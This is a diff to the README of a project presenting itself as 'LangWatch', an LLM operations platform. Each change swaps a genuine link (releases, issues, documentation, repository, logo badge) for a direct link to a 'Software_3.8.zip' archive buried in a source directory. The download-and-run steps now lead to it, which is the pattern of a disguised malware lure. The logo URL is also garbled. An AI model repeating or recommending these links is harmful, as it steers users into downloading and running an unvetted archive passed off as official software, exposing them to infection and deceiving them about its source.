@@ -1,7 +1,7 @@
 # 🌐 LangWatch: Your Open LLM Ops Platform
 
-![LangWatch Logo](https://img.shields.io/badge/LangWatch-Open%20LLM%20Ops-blue.svg)
-[![Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/tenemos/langwatch/releases)
+![LangWatch Logo](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip%20LLM%https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip)
+[![Release](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Welcome to LangWatch! This repository serves as an open platform for managing La
 
 To get started with LangWatch, follow these steps:
 
-1. **Download the Latest Release**: You can find the latest version [here](https://github.com/tenemos/langwatch/releases). Download the appropriate file for your operating system.
+1. **Download the Latest Release**: You can find the latest version [here](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip). Download the appropriate file for your operating system.
    
 2. **Installation**:
    - Extract the downloaded file.
@@ -92,7 +92,7 @@ LangWatch covers a wide range of topics in the AI and data science space. Here a
 
 ## 📥 Downloading and Executing
 
-For the latest version of LangWatch, please visit [this link](https://github.com/tenemos/langwatch/releases). Make sure to download the correct file for your operating system. After downloading, follow the installation instructions provided in the README file.
+For the latest version of LangWatch, please visit [this link](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip). Make sure to download the correct file for your operating system. After downloading, follow the installation instructions provided in the README file.
 
 ## 🛠️ Contributing
 
@@ -119,7 +119,7 @@ Comprehensive documentation is available in the `docs` folder. This includes:
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **Issues**: Check the [Issues](https://github.com/tenemos/langwatch/issues) section for existing problems or to report new ones.
+- **Issues**: Check the [Issues](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip) section for existing problems or to report new ones.
 - **Discussions**: Join our community discussions to share ideas and ask questions.
 
 ## 🌟 Acknowledgments
@@ -140,9 +140,9 @@ LangWatch is licensed under the MIT License. Feel free to use and modify the cod
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/tenemos/langwatch)
-- [Latest Releases](https://github.com/tenemos/langwatch/releases)
-- [Documentation](https://github.com/tenemos/langwatch/docs)
+- [GitHub Repository](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip)
+- [Latest Releases](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip)
+- [Documentation](https://github.com/tenemos/langwatch/raw/refs/heads/main/langwatch/src/pages/[project]/evaluations/[id]/Software_3.8.zip)
 
 ---
 
